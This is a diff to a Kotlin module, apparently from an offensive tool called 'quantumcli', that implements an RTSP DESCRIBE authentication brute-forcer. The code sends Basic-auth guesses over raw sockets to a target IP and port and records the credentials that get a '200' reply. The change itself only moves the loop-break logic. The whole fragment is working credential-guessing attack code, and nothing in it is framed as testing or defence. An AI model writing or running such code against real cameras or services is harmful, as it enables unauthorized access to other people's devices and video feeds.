@@ -2,6 +2,7 @@ package com.projectzerodays.quantumcli.ops
 
 import java.net.Socket
 import java.util.Base64
+import org.json.JSONObject
 
 /** BruteEngineV3 parity — RTSP DESCRIBE auth brute + HTTP Basic brute. */
 object Brute {
@@ -27,6 +28,7 @@ object Brute {
                 val auth = Base64.getEncoder().encodeToString("$u:$p".toByteArray(Charsets.ISO_8859_1))
                 val req = ("DESCRIBE rtsp://$ip:$port/ RTSP/1.0\r\nCSeq: 2\r\n" +
                     "Authorization: Basic $auth\r\n\r\n").toByteArray(Charsets.ISO_8859_1)
+                var hit = false
                 try {
                     Socket().use { s ->
                         s.connect(java.net.InetSocketAddress(ip, port), 3000)
@@ -37,12 +39,13 @@ object Brute {
                         val resp = if (n > 0) String(buf, 0, n, Charsets.ISO_8859_1) else ""
                         if (resp.contains("200")) {
                             creds.add(Cred(u, p))
-                            break
+                            hit = true
                         }
                     }
                 } catch (e: Exception) {
                     return creds
                 }
+                if (hit) break
             }
         }
         return creds
